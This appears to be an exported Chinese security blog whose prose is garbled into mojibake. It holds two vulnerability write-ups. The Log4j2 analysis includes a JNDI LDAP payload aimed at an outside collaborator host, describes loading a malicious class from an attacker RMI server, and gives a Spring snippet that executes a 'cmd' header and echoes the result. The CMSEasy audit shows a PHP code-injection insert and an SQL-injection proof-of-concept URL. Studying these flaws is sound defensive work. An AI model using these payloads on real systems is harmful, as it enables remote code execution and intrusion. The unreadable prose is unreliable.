<p>é—®é¢˜ç‚¹å‡ºåœ¨<code>org.apache.logging.log4j.core.lookup.JndiLookup</code></p>
<p>ç›´æ¥æ‰“æ–­ç‚¹</p>
<p>è·Ÿè¸ªæ–­ç‚¹å‘ç°ï¼Œåœ¨æµ‹è¯•ç±»ä¸­å®ä¾‹åŒ–loggerç±»çš„è¿‡ç¨‹ä¸­ï¼Œ</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/Tu1taj"><img src="https://s4.ax1x.com/2021/12/20/Tu1taj.png" alt="Tu1taj.png" loading="lazy"></a></figure>
<p>æ ¹æ®å…³é”®è¯å»ºç«‹å¯¹åº”ç±»çš„æ˜ å°„å…³ç³»</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/Tu13M8"><img src="https://s4.ax1x.com/2021/12/20/Tu13M8.png" alt="Tu13M8.png" loading="lazy"></a></figure>
<p>è¿™æ˜¯ä¸€ä¸ªå¤§å‰æã€‚</p>
<p>ç°åœ¨å›åˆ°JNDILOOKUPï¼Œç›´æ¥åœ¨å‡½æ•°<code>lookup</code>ä¸­ä¸‹æ–­ç‚¹ï¼Œå¼€å§‹DEBUGã€‚</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/Tu1NIs"><img src="https://s4.ax1x.com/2021/12/20/Tu1NIs.png" alt="Tu1NIs.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/Tu1ain"><img src="https://s4.ax1x.com/2021/12/20/Tu1ain.png" alt="Tu1ain.png" loading="lazy"></a></figure>
<p>å¯ä»¥çœ‹åˆ°IDEAå¾ˆæ–¹ä¾¿çš„ç»™å‡ºäº†è°ƒç”¨æ ˆã€‚å…¶å®åœ¨å®é™…çš„è·Ÿè¸ªè¿‡ç¨‹ä¸­å‘ç°ï¼Œçº¢æ¡†å‰é¢çš„å‡½æ•°åŸºæœ¬éƒ½æ˜¯åœ¨å¥—å¨ƒã€‚æ²¡æœ‰å…·ä½“çš„åŠ¨ä½œ</p>
<p><strong>åƒè¿™æ ·</strong></p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/Tu10zV"><img src="https://s4.ax1x.com/2021/12/20/Tu10zV.png" alt="Tu10zV.png" loading="lazy"></a></figure>
<p>éšç€å¥—å¨ƒæ¥åˆ°ç¬¬ä¸€ä¸ªå…³é”®ç‚¹<code>MessagePatternConverter.format()</code>,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œå®˜æ–¹ä¸»åŠ¨åˆ¤æ–­**${**ç¬¦å·ï¼Œè¿›å…¥replaceå‡½æ•°</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/Tu1wR0"><img src="https://s4.ax1x.com/2021/12/20/Tu1wR0.png" alt="Tu1wR0.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/Tu1dGq"><img src="https://s4.ax1x.com/2021/12/20/Tu1dGq.png" alt="Tu1dGq.png" loading="lazy"></a></figure>
<p>replaceåˆæ˜¯å¥—å¨ƒï¼Œç»§ç»­è·Ÿè¿›åˆ°<code>StrSubstitutor.substitute()</code>,è¿™é‡Œå¯¹ä¼ å…¥çš„å˜é‡å¤„ç†ï¼Œå‰”é™¤å‡ºé¢å¤–çš„å­—ç¬¦ä¸²</p>
<pre><code class="language-java">æ­¤æ—¶varNameExpr=&quot;jndi:ldap://0tubdem0sszb8wlxw9w0pmpprgx6lv.burpcollaborator.net&quot;
</code></pre>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/Tu1rsU"><img src="https://s4.ax1x.com/2021/12/20/Tu1rsU.png" alt="Tu1rsU.png" loading="lazy"></a></figure>
<p>ç„¶åç»§ç»­å¤„ç†å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆæŠŠå€¼èµ‹ç»™<strong>varname</strong></p>
<p>ç­‰å¤„ç†è¿‡ç¨‹å®Œæˆåè°ƒç”¨<code>resolveVariable</code>å‡½æ•°ï¼Œå®šç›ä¸€çœ‹ï¼Œè¯¶æ€ä¹ˆå°±ç›´æ¥å†’äº†ä¸€ä¸ªlookupå‡ºæ¥å‘¢?</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/Tu16Z4"><img src="https://s4.ax1x.com/2021/12/20/Tu16Z4.png" alt="Tu16Z4.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/Tu1sLF"><img src="https://s4.ax1x.com/2021/12/20/Tu1sLF.png" alt="Tu1sLF.png" loading="lazy"></a></figure>
<h2 id="æ­å¼€è°œåº•-jndilookupåœ¨å“ªé‡Œ">æ­å¼€è°œåº•--JNDILookupåœ¨å“ªé‡Œ?</h2>
<p>åŸæ¥æ˜¯æ­¤æ—¶å’Œå¼€å§‹åˆå§‹åŒ–çš„å†…å®¹å‘¼åº”ä¸Šäº†</p>
<p><code>getVariableResolver</code>è¿™ä¸ªå‡½æ•°è·å–çš„å†…å®¹ç”±<code>return this.variableResolver;</code>è¿”å›ï¼Œè¿”å›çš„æ˜¯StrSubstitutorè¿™ä¸ªç±»çš„variableResolverï¼Œè€ŒStrSubstitutorçš„å†…å®¹åˆæ¥è‡ª<code>Interpolator</code>ç±»ï¼Œä¹Ÿå°±æ˜¯åˆå§‹åŒ–ç”¨åˆ°çš„é‚£ä¸ªç±»ï¼Œå€¼ä¹Ÿæ˜¯ä¹‹å‰çš„ã€‚</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/Tu1cdJ"><img src="https://s4.ax1x.com/2021/12/20/Tu1cdJ.png" alt="Tu1cdJ.png" loading="lazy"></a></figure>
<p>è¿›å…¥<code>resolver.lookup</code>å¯ä»¥çœ‹åˆ°ï¼Œæˆªå–å­—ç¬¦ä¸²è·å–å‰ç¼€prefix,è¿™é‡Œå°±æ˜¯jndiã€‚</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/Tu1RiR"><img src="https://s4.ax1x.com/2021/12/20/Tu1RiR.png" alt="Tu1RiR.png" loading="lazy"></a></figure>
<p><strong>jndiå‰ç¼€å¯¹åº”JndILookup</strong>ä¹Ÿæ˜¯åˆå§‹åŒ–åå·²ç»å»ºç«‹å¥½çš„å…³ç³»ã€‚</p>
<h2 id="å¯æ§çš„lookupå˜é‡">å¯æ§çš„lookupå˜é‡</h2>
<p>è¿›å…¥JNDILookupä¹‹åå°±å¾ˆé¡ºåˆ©ï¼Œç»§ç»­è·Ÿè¸ªå‡½æ•°å®šä½åˆ°<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>ç±»çš„lookupæ–¹æ³•.</p>
<p>åˆ°è¿™ä¸€æ­¥å…¶å®å·²ç»è±ç„¶å¼€æœ—äº†ï¼Œå½“ä¸€ä¸ªlookupçš„å‚æ•°å¯æ§æ— è¿‡æ»¤ï¼Œæˆ‘ä»¬æœ‰ä»€ä¹ˆç†ç”±ä¸è®¤ä¸ºè¿™æ˜¯ä¸ª<font color='red'><strong>JNDIæ³¨å…¥</strong></font>å‘¢ï¼Ÿ</p>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/Tu1WJ1"><img src="https://s4.ax1x.com/2021/12/20/Tu1WJ1.png" alt="Tu1WJ1.png" loading="lazy"></a></figure>
<h1 id="0x03-åˆ©ç”¨">0X03 åˆ©ç”¨</h1>
<p>ç»è¿‡åˆ†æï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ¼æ´å¹¶æ— ä»€ä¹ˆè‹›åˆ»çš„è¦æ±‚ã€‚åªè¦æ˜¯è°ƒç”¨äº†log4j2çš„è®°å½•åŠŸèƒ½ä¸”ç”¨æˆ·å¯ä»¥æ§åˆ¶è¾“å…¥å³å¯ã€‚</p>
<p>ç®€å•æ˜“ç”¨ï¼Œè¡¨ç°åœ¨å®æˆ˜ä¸­å°±æ˜¯è§æ¡†å°±æ’ï¼Œheaderé‡Œé¢é™¤äº†payloadå•¥éƒ½æ²¡æœ‰(ç¬‘)ã€‚</p>
<p>å¦‚æœæƒ³RCEï¼Œåˆ™éœ€è¦å…ˆå†™å¥½æ¶æ„ç±»ï¼Œå†ç¼–è¯‘æˆclassã€‚å’Œååºåˆ—åŒ–çš„åˆ©ç”¨è¿‡ç¨‹ä¸€æ¨¡ä¸€æ ·ã€‚</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/Tu1IsO"><img src="https://s4.ax1x.com/2021/12/20/Tu1IsO.png" alt="Tu1IsO.png" loading="lazy"></a></figure>
<h1 id="0x04-å·®ç‚¹ä»€ä¹ˆ">0X04 å·®ç‚¹ä»€ä¹ˆ?</h1>
<p>éº»çƒ¦çš„å›å¼¹shellæ˜¾ç„¶æ²¡æœ‰ç›´æ¥æ‰§è¡Œå‘½ä»¤ä¸”å›æ˜¾æ¥çš„çˆ½å¿«ã€‚ä½œä¸ºèœé¸¡ä¹Ÿæ˜¯å¾ˆç¾¡æ…•å¤§ä½¬ä»¬çš„æ“ä½œçš„ã€‚é‚£ä¹ˆï¼Œæ€ä¹ˆæ‰èƒ½æŠŠæƒ³è¦çš„ç»“æœå›æ˜¾åˆ°ç½‘é¡µçš„ä¸­å‘¢?</p>
<h2 id="ç†è§£ä»€ä¹ˆæ˜¯jndiæ³¨å…¥">ç†è§£ä»€ä¹ˆæ˜¯JNDIæ³¨å…¥?</h2>
<blockquote>
<ol>
<li>ç›®æ ‡ä»£ç ä¸­è°ƒç”¨äº†InitialContext.lookup(URI)ï¼Œä¸”URIä¸ºç”¨æˆ·å¯æ§ï¼›</li>
<li>æ”»å‡»è€…æ§åˆ¶URIå‚æ•°ä¸ºæ¶æ„çš„RMIæœåŠ¡åœ°å€ï¼Œå¦‚ï¼šrmi://hacker_rmi_server//nameï¼›</li>
<li>æ”»å‡»è€…RMIæœåŠ¡å™¨å‘ç›®æ ‡è¿”å›ä¸€ä¸ªReferenceå¯¹è±¡ï¼ŒReferenceå¯¹è±¡ä¸­æŒ‡å®šæŸä¸ªç²¾å¿ƒæ„é€ çš„Factoryç±»ï¼›</li>
<li>ç›®æ ‡åœ¨è¿›è¡Œlookup()æ“ä½œæ—¶ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶å®ä¾‹åŒ–Factoryç±»ï¼Œæ¥ç€è°ƒç”¨factory.getObjectInstance()è·å–å¤–éƒ¨è¿œç¨‹å¯¹è±¡å®ä¾‹ï¼›</li>
<li>æ”»å‡»è€…å¯ä»¥åœ¨Factoryç±»æ–‡ä»¶çš„æ„é€ æ–¹æ³•ã€é™æ€ä»£ç å—ã€getObjectInstance()æ–¹æ³•ç­‰å¤„å†™å…¥æ¶æ„ä»£ç ï¼Œè¾¾åˆ°RCEçš„æ•ˆæœï¼›</li>
</ol>
</blockquote>
<p>æ ¹æ®åŸç†å¯çŸ¥ï¼ŒJNDIæ³¨å…¥å®é™…ä¸Šæ˜¯å»æ‹‰å–å—æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„æœåŠ¡å™¨ä¸Šçš„æ¶æ„ç±»å›æ¥åŠ¨æ€åŠ è½½ã€‚</p>
<h2 id="å›æ˜¾è·å–responseå’Œrequest">å›æ˜¾?è·å–responseå’Œrequest!</h2>
<p>æ ¹æ®æˆ‘ç²—æµ…çš„å¼€å‘ç»éªŒï¼Œåªè¦èƒ½æ‹¿åˆ°<code>Request</code> å’Œ<code>Response</code>å¯¹è±¡å³å¯è¿›è¡Œå›æ˜¾çš„æ„é€ ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯ä¼—å¤šæ–¹å¼çš„ä¸€ç§ã€‚ä¹Ÿæ˜¯ç›®å‰ç”¨çš„è¾ƒå¤šçš„æ–¹å¼ã€‚</p>
<h2 id="å®è·µ">å®è·µ</h2>
<p>é…ç½®ä¸€ä¸ªspring+log4j+mybitsé¶åœº</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="responseåŠ«æŒ"><strong>responseåŠ«æŒ</strong></h3>
<p>æ€ä¹ˆè§‚å¯Ÿä¸­é—´ä»¶çš„responseï¼Ÿåœ¨è¿”å›æ—¶æ‰“æ–­ç‚¹</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/Tu1oLD"><img src="https://s4.ax1x.com/2021/12/20/Tu1oLD.md.png" alt="Tu1oLD.md.png" loading="lazy"></a></figure>
<p><strong>é€šè¿‡åŠæ—¶è¡¨è¾¾å¼ï¼Œæ‰‹åŠ¨æŸ¥çœ‹å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡(ä¹Ÿå°±æ˜¯Thread.currentThread())çš„threadLocals</strong></p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/Tu18sS"><img src="https://s4.ax1x.com/2021/12/20/Tu18sS.png" alt="Tu18sS.png" loading="lazy"></a></figure>
<p>é€šè¿‡æŸ¥çœ‹threadlocalsçš„tablesçš„å€¼æ‰¾åˆ°requestå’Œresponseæ‰€åœ¨çš„ä½ç½®ï¼Œè¿™é‡Œæ˜¯14</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/Tu1Gqg"><img src="https://s4.ax1x.com/2021/12/20/Tu1Gqg.png" alt="Tu1Gqg.png" loading="lazy"></a></figure>
<p><strong>ä¿®æ”¹responseçš„è¾“å‡ºæµ</strong></p>
<pre><code class="language-java">((ServletRequestAttributes) Thread.currentThread().threadLocals.table[14].value).response.getOutputStream().println(&quot;change response----------------------------&quot;)
</code></pre>
<p><strong>è¿™é‡Œå¯ä»¥ç”¨</strong> <strong>getOutputStream æˆ–è€… getwrite å…·ä½“çœ‹æŠ¥é”™</strong></p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/Tu1lxf"><img src="https://s4.ax1x.com/2021/12/20/Tu1lxf.png" alt="Tu1lxf.png" loading="lazy"></a></figure>
<p>æœ€åæ”¾åŒ…å¾—åˆ°å“åº”ï¼Œå¯ä»¥çœ‹åˆ°ç»“æœä¹‹å‰å¤šäº†æˆ‘ä»¬ä¿®æ”¹çš„å­—ç¬¦</p>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/Tu1YZQ"><img src="https://s4.ax1x.com/2021/12/20/Tu1YZQ.png" alt="Tu1YZQ.png" loading="lazy"></a></figure>
<h3 id="å¯å›æ˜¾çš„springé©¬">å¯å›æ˜¾çš„springé©¬</h3>
<p>ä¸Šé¢åªæ˜¯ç ”ç©¶äº†ä¸€ä¸‹æ€ä¹ˆç®€å•çš„æ›´æ”¹å›æ˜¾ã€‚å®é™…éœ€è¦æ”¹çš„åœ°æ–¹è¿˜æ˜¯å¾ˆå¤šçš„ã€‚</p>
<p>å®é™…ä¸Šspringæœ‰è‡ªå·±è·å–requestå’Œresponseçš„åœ°æ–¹</p>
<p>https://github.com/feihong-cs/Java-Rce-Echo</p>
<pre><code class="language-java">org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        
javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        
javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader(&quot;cmd&quot;);
		if(cmd != null &amp;&amp; !cmd.isEmpty()){
			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
			httpresponse.getWriter().println(res);
		}
</code></pre>
<p>æˆ‘ä»¬æ”¹æ”¹å°±å¯ä»¥ç”¨</p>
<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Tu1fRx"><img src="https://s4.ax1x.com/2021/12/20/Tu1fRx.md.png" alt="Tu1fRx.md.png" loading="lazy"></a></figure>
<h3 id="æ•ˆæœ">æ•ˆæœ</h3>
<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TKSREQ"><img src="https://s4.ax1x.com/2021/12/21/TKSREQ.png" alt="TKSREQ.png" loading="lazy"></a></figure>
<h1 id="0x05-ç»“è¯­">0x05 ç»“è¯­</h1>
<p>LOL</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CMSEASY-ä»é»‘ç›’åˆ°ä»£ç å®¡è®¡]]></title>
        <id>https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/</id>
        <link href="https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/">
        </link>
        <updated>2021-09-22T10:03:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-å¼€å§‹çš„æ•…äº‹">0x01 å¼€å§‹çš„æ•…äº‹</h1>
<p><strong>ä¸­ç§‹æ—¶èŠ‚ï¼Œç§‹é«˜æ°”çˆ½ï¼Œæ­£æ˜¯æ—¥(åˆ’)ç«™(æ°´)çš„å¥½æ—¥å­,åˆšå¥½å­¦ä¹ ä¸€æ³¢ã€‚</strong><br>
å®˜ç½‘æ›´æ–°å†å²ç‰ˆæœ¬è§‚å¯Ÿ<br>
<img src="https://forum.ywhack.com/attachments/month_2109/2109181641160a30fdc89fa651.png" alt="" loading="lazy"><br>
ä¸¤ä¸ªç‰ˆæœ¬éƒ½ä¸‹<br>
ä½¿ç”¨beyond compare diff æ–‡ä»¶å†…å®¹<br>
ç»“æœå‘ç°å¹¶æ²¡æœ‰diffå‡ºä»€ä¹ˆå†…å®¹æ¥<br>
<img src="https://forum.ywhack.com/attachments/month_2109/21091816434e138746e1aefb18.png" alt="" loading="lazy"><br>
ç´¢æ€§è¿˜æ˜¯é»‘ç›’æµ‹ä¸€æ³¢å§<br>
çœ‹äº†çœ‹æµ‹å‡ºä¸‰ä¸ªé—®é¢˜:</p>
<ul>
<li><strong>sql</strong></li>
<li><strong>ä»£ç æ‰§è¡Œ</strong></li>
<li><strong>è¶Šæƒ</strong></li>
</ul>
<hr>
<h1 id="0x02-çœ‹çœ‹è¶Šæƒ">0x02 çœ‹çœ‹è¶Šæƒ</h1>
<p>admin è¶…çº§ç®¡ç†å‘˜<br>
test  æ¸¸å®¢</p>
<figure data-type="image" tabindex="1"><img src="https://z3.ax1x.com/2021/09/22/4N7lnJ.png" alt="4N7lnJ.png" loading="lazy"></figure>
<p><strong>test</strong>ç”¨æˆ·æ— æƒç™»å½•åå°</p>
<figure data-type="image" tabindex="2"><img src="https://z3.ax1x.com/2021/09/22/4N7u1U.png" alt="4N7u1U.png" loading="lazy"></figure>
<p>ç”¨testçš„cookieæ·»åŠ å†…å®¹</p>
<figure data-type="image" tabindex="3"><img src="https://z3.ax1x.com/2021/09/22/4N71B9.png" alt="4N71B9.png" loading="lazy"></figure>
<p>çœ‹åˆ°è¿™é‡Œæ·»åŠ æˆåŠŸ</p>
<figure data-type="image" tabindex="4"><img src="https://z3.ax1x.com/2021/09/22/4N7MX4.png" alt="4N7MX4.png" loading="lazy"></figure>
<hr>
<p>å±•å¼€è®²è®²ï¼š</p>
<p>add_action()é‰´æƒåªæ˜ç¡®äº†æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·ï¼Œå¹¶æœªå¯¹ç”¨æˆ·æƒé™åšé™åˆ¶<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7ju4.png" alt="4N7ju4.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4NHSER.png" alt="4NHSER.png" loading="lazy"></p>
<hr>
<h1 id="0x03-ä»£ç æ‰§è¡Œä»£ç æ‰§è¡Œ">0x03 ä»£ç æ‰§è¡Œï¼ä»£ç æ‰§è¡Œï¼</h1>
<p>å†…å®¹ç®¡ç†æ¨¡å—ï¼Œåˆ›å»ºå†…å®¹ä¿®æ”¹åŒ…å†…ä¸ºPHPINFO<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7KcF.png" alt="4N7KcF.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N737R.png" alt="4N737R.png" loading="lazy"><br>
<strong>åˆ†æ</strong><br>
<strong>å…ˆæ‘†ç»“è®º:</strong></p>
<p>insertè¯­å¥æ‹¼æ¥æ—¶ä½¿ç”¨**.=**è¿æ¥ä»¥åŠæ²¡æœ‰è¿‡æ»¤å¥½ï¼Œæ˜¯é€ æˆè¿™ä¸ªæ¼æ´çš„åŸå› </p>
<p>æœ€åinsertè¯­å¥ä¸º:</p>
<pre><code class="language-sql">INSERT INTO `cmseasy_archive`(`checked`,`catid`,`title`,`color`,`langid`,`mtitle`,`keyword`,`description`,`tag`,`htmlrule`,`set_htmlrule`,`thumb`,`attachment_path`,`attachment_id`,`typeid`,`spid`,`subtitle`,`template`,`templatewap`,`nofollow`,`toppost`,`showform`,`introduce`,`adddate`,`updatedate`,`outtime`,`author`,`attr3`,`view`,`linkto`,`province_id`,`city_id`,`section_id`,`content`,`username`,`userid`,`strong`,`pics`,`attr1`,`introduce_len`,`type`,`state`,`listorder`,`readmenoy`,`domwmenoy`) VALUES ('1','1','phpinfo','#000000','1','','','','','','','','','','0','0','','0','0','0','0','0','','2021-09-18 11:23:13','2021-09-18 11:23:13','','admin','','','','0','0','0','&lt;?PHP PHPINFO();?&gt;','admin','1','0','N;','','0','','1','0','0','0')
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z3.ax1x.com/2021/09/22/4N7BBd.png" alt="4N7BBd.png" loading="lazy"></figure>
<p>ä»è·¯ç”±å¼€å§‹è·Ÿè¸ª:</p>
<p>index.phpä¸‹</p>
<p>$front-&gt;dispatch();æ ¹æ®å‚æ•°ä¸­çš„å€¼åˆ†é…è·¯ç”±</p>
<pre><code class="language-php">try{
    $front = new front();
    $front-&gt;dispatch();
}catch(HttpErrorException $e){
    if(config::get('custom404') &amp;&amp; $e-&gt;statusCode == 404){
        header('location: /404.php');
    }else{
        exit($e-&gt;statusCode.':'.$e-&gt;getMessage());
    }
}
</code></pre>
<p>æ–­ç‚¹è¿›å»çœ‹çœ‹</p>
<figure data-type="image" tabindex="6"><img src="https://z3.ax1x.com/2021/09/22/4N7sAI.png" alt="4N7sAI.png" loading="lazy"></figure>
<p>å¯ä»¥çœ‹åˆ°frontç±»å°±æ˜¯indexé¡µé¢ä¸‹è°ƒç”¨çš„ç±»ï¼Œ$caseçš„å€¼å¦‚ä¸‹</p>
<pre><code class="language-php">$case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
</code></pre>
<p>self::$caseåœ¨_construct()å†…è·å–ä¹Ÿå°±æ˜¯åˆå§‹åŒ–çš„æ—¶å€™è·å–ï¼Œè‹¥å­˜åœ¨caseåˆ™è¿›å…¥è¯¥è·¯ç”±ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¿”å›index</p>
<p><img src="https://z3.ax1x.com/2021/09/22/4N764P.png" alt="4N764P.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N7yNt.png" alt="4N7yNt.png" loading="lazy"></p>
<p>åŒæ—¶åœ¨__constructcä¸­è·å–å‚æ•°</p>
<figure data-type="image" tabindex="7"><img src="https://z3.ax1x.com/2021/09/22/4N7238.png" alt="4N7238.png" loading="lazy"></figure>
<p>daddslashes()å‡½æ•°ä½œä¸ºè¿‡æ»¤å‡½æ•°ï¼Œå°†è¾“å…¥çš„å‚æ•°å®ä½“åŒ–</p>
<pre><code class="language-php">if (!function_exists('daddslashes')) {
    function daddslashes($string, $force = 1)
    {
        if (is_array($string)) {
            $keys = array_keys($string);
            foreach ($keys as $key) {
                $val = $string[$key];
                unset($string[$key]);
                $string[addslashes($key)] = daddslashes($val, $force);
            }
        }
        else {
            $string = htmlspecialchars(addslashes(trim($string)), ENT_QUOTES);
            if (!front::$isadmin || (front::$case == 'admin' &amp;&amp; front::$act == 'login')) {
                front::check_type($string, 'safe');
                if (inject_check($string)) {
                    //var_dump($string);
                    event::log('inject', $string);
                    echo $string;exit;

                }

            }
            if (preg_match('/^data:(.*?)/is', $string)) {
                exit('data:');
            }
        }
        return $string;
    }
</code></pre>
<p>æ­¤æ—¶ä¼ å…¥çš„<code>&lt;?php phpinfo();?&gt;</code>å·²ç»å˜æˆ<code>&lt;?php phpinfo();?&gt;</code><br>
æ¥ä¸‹æ¥åœ¨index.phpä¸­è°ƒç”¨dispatch()æ–¹æ³•</p>
<pre><code class="language-php"> function dispatch()
    {
        $case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
        if (!class_exists($case)) {
            throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
        } else {
            $method = self::$act . '_action';
            $case = new $case();
            $case-&gt;init();
            if (method_exists($case, $method))
                $case-&gt;$method();
            else
                throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
            $case-&gt;end();
            //var_dump(get_class($case));
            if (get_class($case) != 'install_act' &amp;&amp; get_class($case) != 'crontab_act') {

                if(config::get('site_push')) {
                    $last = @file_get_contents(ROOT . '/cache/data/xiongzhang.log');
                    if(!$last || $last &lt; date('Y-m-d')){
                        $site = getSiteUrl() . '/index.php?case=crontab&amp;act=xiongzhang';
                        $site .= &quot;&amp;token=&quot;.config::get('cookie_password');
                        _sock($site);
                    }
                }
                //var_dump($site);
                $this-&gt;autocleanstats();//è‡ªåŠ¨æ¸…æ¥šèœ˜è››è®°å½•
                $this-&gt;autobakdatabase();//è‡ªåŠ¨å¤‡ä»½æ•°æ®åº“
                $this-&gt;doarchivetimeout();//å¤„ç†è¿‡æœŸæ–°é—»
                $this-&gt;autocreatehtml();//è‡ªåŠ¨ç”ŸæˆHTML
                $this-&gt;automap(); //è‡ªåŠ¨ç”Ÿæˆç™¾åº¦è°·æ­Œåœ°å›¾
            }
        }
    }
</code></pre>
<p>å¯ä»¥è§‚å¯Ÿåˆ°$caseå®ä¾‹åŒ–åï¼Œmethod_existsåˆ¤æ–­æœ‰æ— ä¼ å…¥çš„æ–¹æ³•ï¼Œç„¶åç›´æ¥æ‰§è¡Œè¯¥æ–¹æ³•</p>
<p>è¿™é‡Œä¼ é€’å‚æ•°ä¸º<strong>act=add</strong></p>
<figure data-type="image" tabindex="8"><img src="https://z3.ax1x.com/2021/09/22/4N74Bj.png" alt="4N74Bj.png" loading="lazy"></figure>
<p>æ‰€ä»¥åº”è¯¥æ‰§è¡Œ<strong>add_action</strong>å‡½æ•°ã€‚</p>
<p>è¿›å…¥å‡½æ•°å†…éƒ¨åå‘ç°<strong>add_action</strong>å‡½æ•°å†…ä½¿ç”¨save_beforeå‡½æ•°å¯¹fron::$getå‚æ•°è¿›è¡Œå¤„ç†</p>
<figure data-type="image" tabindex="9"><img src="https://z3.ax1x.com/2021/09/22/4N7740.png" alt="4N7740.png" loading="lazy"></figure>
<p>è€Œsave_beforeä¹Ÿå°±æ˜¯é€ æˆè¿™ä¸ªæ¼æ´çš„æœ€ç»ˆåŸå› ä¹‹ä¸€ï¼Œå¾ˆç¥å¥‡çš„ä»–åˆæŠŠå®ä¾‹åŒ–çš„å­—ç¬¦è§£ç å›å»äº†ã€‚</p>
<p>çªå‡ºä¸¤ä¸ªå­—</p>
<p><strong>ç¥å¥‡</strong></p>
<figure data-type="image" tabindex="10"><img src="https://z3.ax1x.com/2021/09/22/4N7OvF.png" alt="4N7OvF.png" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://z3.ax1x.com/2021/09/22/4N7LgU.png" alt="4N7LgU.png" loading="lazy"></figure>
<p>å‰©ä¸‹çš„å°±æ˜¯åœ¨add_actionä¸­è°ƒç”¨æ’å…¥æ•°æ®åº“æ“ä½œï¼Œä¸€è·¯è·Ÿè·Ÿè·Ÿè·Ÿï¼Œè·Ÿåˆ°æœ€åçš„sql_insertå‘ç°ä½¿ç”¨**.=**è¿æ¥å‚æ•°</p>
<figure data-type="image" tabindex="12"><img src="https://z3.ax1x.com/2021/09/22/4N7bCV.png" alt="4N7bCV.png" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://z3.ax1x.com/2021/09/22/4N7q3T.png" alt="4N7q3T.png" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://z3.ax1x.com/2021/09/22/4N7xb9.png" alt="4N7xb9.png" loading="lazy"></figure>
<hr>
<p>é™¤äº†è¿™ä¸ªç‚¹ä¹‹å¤–ï¼Œedit_actionä¹Ÿç”¨åˆ°savebeforeã€‚æ‰€ä»¥åªè¦è·¯ç”±ä¸­å¸¦æœ‰<strong>act=edit</strong>å’Œ<strong>act=add</strong>çš„å‚æ•°çš„éƒ½å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´</p>
<h1 id="0x04-sqlä½ ä¸ºä»€ä¹ˆæŠ¥é”™">0x04 SQL,ä½ ä¸ºä»€ä¹ˆæŠ¥é”™!</h1>
<p>POC:</p>
<pre><code class="language-sql">/index.php?case=table&amp;act=edit&amp;table=archive&amp;catid=16&amp;admin_dir=admin&amp;site=default&amp;username=&amp;url=&amp;isvisual=&amp;aid=&amp;dfile=&amp;page=1&amp;id=999
</code></pre>
<p>æ³¨å…¥ç‚¹ åœ¨id=999</p>
<p>å†…ç½®è¿‡æ»¤ï¼Œæš‚æ—¶æ— æ³•åˆ©ç”¨</p>
<figure data-type="image" tabindex="15"><img src="https://z3.ax1x.com/2021/09/22/4N7GA1.png" alt="4N7GA1.png" loading="lazy"></figure>
<p>é¦–å…ˆæ‰“å°æ‰€æœ‰sqlè¯­å¥</p>
<figure data-type="image" tabindex="16"><img src="https://z3.ax1x.com/2021/09/22/4N7Jtx.png" alt="4N7Jtx.png" loading="lazy"></figure>
<p>è§‚å¯Ÿåˆ°æŠ¥é”™ç‚¹</p>
